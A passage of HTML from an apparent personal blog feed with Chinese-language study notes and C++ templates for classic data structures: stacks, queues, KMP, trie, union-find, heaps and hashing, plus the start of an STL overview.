title="栈"></a>栈</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// tt表示栈顶</span></span><br><span class="line"><span class="type">int</span> stk[N], tt = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 向栈顶插入一个数</span></span><br><span class="line">stk[ ++ tt] = x;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 从栈顶弹出一个数</span></span><br><span class="line">tt -- ;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 栈顶的值</span></span><br><span class="line">stk[tt];</span><br><span class="line"></span><br><span class="line"><span class="comment">// 判断栈是否为空</span></span><br><span class="line"><span class="keyword">if</span> (tt &gt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>单调栈</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">常见模型：找出每个数左边离它最近的比它大/小的数</span><br><span class="line"><span class="type">int</span> tt = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i ++ )</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">while</span> (tt &amp;&amp; <span class="built_in">check</span>(stk[tt], i)) tt -- ;</span><br><span class="line">    stk[ ++ tt] = i;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><div class="story post-story"><h2 id="队列"><a href="#队列" class="headerlink" title="队列"></a>队列</h2><p>普通队列</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// hh 表示队头，tt表示队尾</span></span><br><span class="line"><span class="type">int</span> q[N], hh = <span class="number">0</span>, tt = <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 向队尾插入一个数</span></span><br><span class="line">q[ ++ tt] = x;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 从队头弹出一个数</span></span><br><span class="line">hh ++ ;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 队头的值</span></span><br><span class="line">q[hh];</span><br><span class="line"></span><br><span class="line"><span class="comment">// 判断队列是否为空</span></span><br><span class="line"><span class="keyword">if</span> (hh &lt;= tt)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>循环队列</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// hh 表示队头，tt表示队尾的后一个位置</span></span><br><span class="line"><span class="type">int</span> q[N], hh = <span class="number">0</span>, tt = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 向队尾插入一个数</span></span><br><span class="line">q[tt ++ ] = x;</span><br><span class="line"><span class="keyword">if</span> (tt == N) tt = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 从队头弹出一个数</span></span><br><span class="line">hh ++ ;</span><br><span class="line"><span class="keyword">if</span> (hh == N) hh = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 队头的值</span></span><br><span class="line">q[hh];</span><br><span class="line"></span><br><span class="line"><span class="comment">// 判断队列是否为空</span></span><br><span class="line"><span class="keyword">if</span> (hh != tt)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>单调队列</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">常见模型：找出滑动窗口中的最大值/最小值</span><br><span class="line"><span class="type">int</span> hh = <span class="number">0</span>, tt = <span class="number">-1</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i ++ )</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">while</span> (hh &lt;= tt &amp;&amp; <span class="built_in">check_out</span>(q[hh])) hh ++ ;  <span class="comment">// 判断队头是否滑出窗口</span></span><br><span class="line">    <span class="keyword">while</span> (hh &lt;= tt &amp;&amp; <span class="built_in">check</span>(q[tt], i)) tt -- ;</span><br><span class="line">    q[ ++ tt] = i;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><div class="story post-story"><h2 id="KMP字符串匹配算法"><a href="#KMP字符串匹配算法" class="headerlink" title="KMP字符串匹配算法"></a>KMP字符串匹配算法</h2><p>核心思想：在每次失配时，不是把p串往后移一位，而是把p串往后移动至下一次可以和前面部分匹配的位置，这样就可以跳过大多数的失配步骤。而每次p串移动的步数就是通过查找next[ ]数组确定的。</p><p>“非平凡前缀”：指除了最后一个字符以外，一个字符串的全部头部组合。<br>“非平凡后缀”：指除了第一个字符以外，一个字符串的全部尾部组合（简称前后缀）</p><p>next数组的含义：对next[ j ] ，是p[ 1, j ]串中前缀和后缀相同的最大长度（部分匹配值），即 p[ 1, next[ j ] ] &#x3D; p[ j - next[ j ] + 1, j ]，也就是最长公共长度。（起始位1）next数组的求法是通过模板串自己与自己进行匹配操作得出来的</p><p><img src="https://cdn.acwing.com/media/article/image/2020/06/12/31041_97225cdcac-next%E6%95%B0%E7%BB%84.PNG" class="lazyload" data-srcset="https://cdn.acwing.com/media/article/image/2020/06/12/31041_97225cdcac-next%E6%95%B0%E7%BB%84.PNG" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="next数组.PNG"></p><p>对 p &#x3D; “abcab”</p><p>​      p   abcab<br>下标    12345<br>next[ ]00012</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// s[]是长文本，p[]是模式串，n是s的长度，m是p的长度</span></span><br><span class="line">求模式串的Next数组：</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">2</span>, j = <span class="number">0</span>; i &lt;= m; i ++ )</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">while</span> (j &amp;&amp; p[i] != p[j + <span class="number">1</span>]) j = ne[j];</span><br><span class="line">   </span><br><span class="line">    <span class="keyword">if</span> (p[i] == p[j + <span class="number">1</span>]) j ++ ;</span><br><span class="line"></span><br><span class="line">    ne[i] = j;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 匹配</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>, j = <span class="number">0</span>; i &lt;= n; i ++ )</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">while</span> (j &amp;&amp; s[i] != p[j + <span class="number">1</span>]) j = ne[j];</span><br><span class="line">     <span class="comment">//如果j有对应p串的元素， 且s[i] != p[j+1], 则失配， 移动p串</span></span><br><span class="line">    <span class="comment">//用while是由于移动后可能仍然失配，所以要继续移动直到匹配或整个p串移到后面（j = 0)</span></span><br><span class="line">    <span class="keyword">if</span> (s[i] == p[j + <span class="number">1</span>]) j ++ ;</span><br><span class="line">        <span class="comment">//当前元素匹配，j移向p串下一位</span></span><br><span class="line">    <span class="keyword">if</span> (j == m)</span><br><span class="line">    &#123;</span><br><span class="line">        j = ne[j];</span><br><span class="line">        <span class="comment">// 匹配成功后的逻辑</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><div class="story post-story"><h2 id="Tire树"><a href="#Tire树" class="headerlink" title="Tire树"></a>Tire树</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> son[N][<span class="number">26</span>], cnt[N], idx;<span class="comment">//idx意义同本身的值和指向下一个结点的指针</span></span><br><span class="line"><span class="comment">// 0号点既是根节点，又是空节点</span></span><br><span class="line"><span class="comment">// son[][]存储树中每个节点的子节点</span></span><br><span class="line"><span class="comment">// cnt[]存储以每个节点结尾的单词数量</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 插入一个字符串</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">insert</span><span class="params">(<span class="type">char</span> *str)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> p = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; str[i]; i ++ )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> u = str[i] - <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span> (!son[p][u]) son[p][u] = ++ idx;</span><br><span class="line">        p = son[p][u];</span><br><span class="line">    &#125;</span><br><span class="line">    cnt[p] ++ ;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 查询字符串出现的次数</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">query</span><span class="params">(<span class="type">char</span> *str)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> p = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; str[i]; i ++ )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> u = str[i] - <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span> (!son[p][u]) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        p = son[p][u];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> cnt[p];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><div class="story post-story"><h2 id="并查集"><a href="#并查集" class="headerlink" title="并查集"></a>并查集</h2><p>1.将两个集合合并<br>2.询问两个元素是否在一个集合当中<br>基本原理:每个集合用一棵树来表示。树根的编号就是整个集合的编号。每个节点存储它的父节点，p[x]表示x的父节点</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line">(<span class="number">1</span>)朴素并查集：</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> p[N]; <span class="comment">//存储每个点的祖宗节点</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 返回x的祖宗节点</span></span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">find</span><span class="params">(<span class="type">int</span> x)</span></span></span><br><span class="line"><span class="function">    </span>&#123;<span class="comment">//返回x的祖先节点 + 路径压缩</span></span><br><span class="line">        <span class="comment">//祖先节点的父节点是自己本身</span></span><br><span class="line">        <span class="keyword">if</span> (p[x] != x)  <span class="comment">//将x的父亲置为x父亲的祖先节点,实现路径的压缩</span></span><br><span class="line">            p[x] = <span class="built_in">find</span>(p[x]);</span><br><span class="line">        <span class="keyword">return</span> p[x];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 初始化，假定节点编号是1~n</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i ++ ) p[i] = i;</span><br><span class="line">    <span class="comment">//就是将当前数据的父节点指向自己</span></span><br><span class="line">    <span class="comment">// 合并a和b所在的两个集合：</span></span><br><span class="line">    p[<span class="built_in">find</span>(a)] = <span class="built_in">find</span>(b);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">(<span class="number">2</span>)维护size的并查集：</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> p[N], size[N];</span><br><span class="line">    <span class="comment">//p[]存储每个点的祖宗节点, size[]只有祖宗节点的有意义，表示祖宗节点所在集合中的点的数量</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 返回x的祖宗节点</span></span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">find</span><span class="params">(<span class="type">int</span> x)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (p[x] != x) p[x] = <span class="built_in">find</span>(p[x]);</span><br><span class="line">        <span class="keyword">return</span> p[x];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 初始化，假定节点编号是1~n</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i ++ )</span><br><span class="line">    &#123;</span><br><span class="line">        p[i] = i;</span><br><span class="line">        size[i] = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 合并a和b所在的两个集合：</span></span><br><span class="line">    size[<span class="built_in">find</span>(b)] += size[<span class="built_in">find</span>(a)];</span><br><span class="line">    p[<span class="built_in">find</span>(a)] = <span class="built_in">find</span>(b);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">(<span class="number">3</span>)维护到祖宗节点距离的并查集：</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> p[N], d[N];</span><br><span class="line">    <span class="comment">//p[]存储每个点的祖宗节点, d[x]存储x到p[x]的距离</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 返回x的祖宗节点</span></span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">find</span><span class="params">(<span class="type">int</span> x)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (p[x] != x)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="type">int</span> u = <span class="built_in">find</span>(p[x]);</span><br><span class="line">            d[x] += d[p[x]];</span><br><span class="line">            p[x] = u;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> p[x];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 初始化，假定节点编号是1~n</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i ++ )</span><br><span class="line">    &#123;</span><br><span class="line">        p[i] = i;</span><br><span class="line">        d[i] = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 合并a和b所在的两个集合：</span></span><br><span class="line">    p[<span class="built_in">find</span>(a)] = <span class="built_in">find</span>(b);</span><br><span class="line">    d[<span class="built_in">find</span>(a)] = distance; <span class="comment">// 根据具体问题，初始化find(a)的偏移量</span></span><br></pre></td></tr></table></figure></div><div class="story post-story"><h2 id="堆"><a href="#堆" class="headerlink" title="堆"></a>堆</h2><p>堆是一种<strong>完全二叉树</strong>，复习一下完全二叉树的定义，完全二叉树的形式是指除了最后一层之外，其他所有层的结点都是满的，而最后一层的所有结点都靠左边。教材上定义如下:</p><blockquote><p>若设二叉树的深度为h，除第 h 层外，其它各层 (1～h-1) 的结点数都达到最大个数，第 h 层所有的结点都连续集中在最左边，这就是完全二叉树。</p></blockquote><p>如下图所示，就是一种典型的完全二叉树:</p><p><img src="https://pic3.zhimg.com/80/v2-84c421b68e718a38f5dcfb1ceaf513f2_720w.jpg" class="lazyload" data-srcset="https://pic3.zhimg.com/80/v2-84c421b68e718a38f5dcfb1ceaf513f2_720w.jpg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="img"></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// h[N]存储堆中的值, h[1]是堆顶，x的左儿子是2x, 右儿子是2x + 1</span></span><br><span class="line"><span class="comment">// ph[k]存储第k个插入的点在堆中的位置</span></span><br><span class="line"><span class="comment">// hp[k]存储堆中下标是k的点是第几个插入的</span></span><br><span class="line"><span class="type">int</span> h[N], ph[N], hp[N], size;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 交换两个点，及其映射关系</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">heap_swap</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">swap</span>(ph[hp[a]],ph[hp[b]]);</span><br><span class="line">    <span class="built_in">swap</span>(hp[a], hp[b]);</span><br><span class="line">    <span class="built_in">swap</span>(h[a], h[b]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">down</span><span class="params">(<span class="type">int</span> u)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> t = u;</span><br><span class="line">    <span class="keyword">if</span> (u * <span class="number">2</span> &lt;= size &amp;&amp; h[u * <span class="number">2</span>] &lt; h[t]) t = u * <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">if</span> (u * <span class="number">2</span> + <span class="number">1</span> &lt;= size &amp;&amp; h[u * <span class="number">2</span> + <span class="number">1</span>] &lt; h[t]) t = u * <span class="number">2</span> + <span class="number">1</span>                                 ;</span><br><span class="line">    <span class="keyword">if</span> (u != t)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">heap_swap</span>(u, t);</span><br><span class="line">        <span class="built_in">down</span>(t);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">up</span><span class="params">(<span class="type">int</span> u)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">while</span> (u / <span class="number">2</span> &amp;&amp; h[u] &lt; h[u / <span class="number">2</span>])</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">heap_swap</span>(u, u / <span class="number">2</span>);</span><br><span class="line">        u &gt;&gt;= <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// O(n)建堆</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = n / <span class="number">2</span>; i; i -- ) <span class="built_in">down</span>(i);</span><br></pre></td></tr></table></figure></div><div class="story post-story"><h2 id="一般哈希"><a href="#一般哈希" class="headerlink" title="一般哈希"></a>一般哈希</h2><p>(1) 拉链法<br>    int h[N], e[N], ne[N], idx;</p><pre><code>// 向哈希表中插入一个数void insert(int x)&#123;    int k = (x % N + N) % N;    e[idx] = x;    ne[idx] = h[k];    h[k] = idx ++ ;&#125;// 在哈希表中查询某个数是否存在bool find(int x)&#123;    int k = (x % N + N) % N;    for (int i = h[k]; i != -1; i = ne[i])        if (e[i] == x)            return true;    return false;&#125;</code></pre><p>(2) 开放寻址法<br>    int h[N];</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 如果x在哈希表中，返回x的下标；如果x不在哈希表中，返回x应该插入的位置</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">find</span><span class="params">(<span class="type">int</span> x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> t = (x % N + N) % N;</span><br><span class="line">    <span class="keyword">while</span> (h[t] != null &amp;&amp; h[t] != x)</span><br><span class="line">    &#123;</span><br><span class="line">        t ++ ;</span><br><span class="line">        <span class="keyword">if</span> (t == N) t = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> t;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><div class="story post-story"><h2 id="字符串哈希"><a href="#字符串哈希" class="headerlink" title="字符串哈希"></a>字符串哈希</h2><p>核心思想：将字符串看成P进制数，P的经验值是131或13331，取这两个值的冲突概率低<br>小技巧：取模的数用2^64，这样直接用unsigned long long存储，溢出的结果就是取模的结果</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> ULL;</span><br><span class="line">ULL h[N], p[N]; <span class="comment">// h[k]存储字符串前k个字母的哈希值, p[k]存储 P^k mod 2^64</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 初始化</span></span><br><span class="line">p[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i ++ )</span><br><span class="line">&#123;</span><br><span class="line">    h[i] = h[i - <span class="number">1</span>] * P + str[i];</span><br><span class="line">    p[i] = p[i - <span class="number">1</span>] * P;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 计算子串 str[l ~ r] 的哈希值</span></span><br><span class="line"><span class="function">ULL <span class="title">get</span><span class="params">(<span class="type">int</span> l, <span class="type">int</span> r)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> h[r] - h[l - <span class="number">1</span>] * p[r - l + <span class="number">1</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据结构 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>算法基础</title>
      <link href="/2022/07/07/%E7%AE%97%E6%B3%95%E5%9F%BA%E7%A1%80-%E5%BF%AB%E6%8E%92/"/>
      <url>/2022/07/07/%E7%AE%97%E6%B3%95%E5%9F%BA%E7%A1%80-%E5%BF%AB%E6%8E%92/</url>
      
        <content type="html"><![CDATA[<div class="story post-story"><h2 id="STL"><a href="#STL" class="headerlink" title="STL"></a>STL</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line">vector, 变长数组，倍增的思想</span><br><span class="line">    <span class="built_in">size</span>()  返回元素个数</span><br><span class="line">    <span class="built_in">empty</span>()  返回是否为空</span><br><span class="line">    <span class="built_in">clear</span>()  清空</span><br><span class="line">    <span class="built_in">front</span>()/<span class="built_in">back</span>()</span><br><span class="line">    <span class="built_in">push_back</span>()/<span class="built_in">pop_back</span>()</span><br><span class="line">    <span class="built_in">begin</span>()/<span class="built_in">end</span>()</span><br><span class="line">    []</span><br><span class="line">    支持比较运算，按字典序</span><br><span class="line"></span><br><span class="line">pair&lt;<span class="type">int</span>, <span class="type">int</span>&gt;</span><br><span class="line">    first, 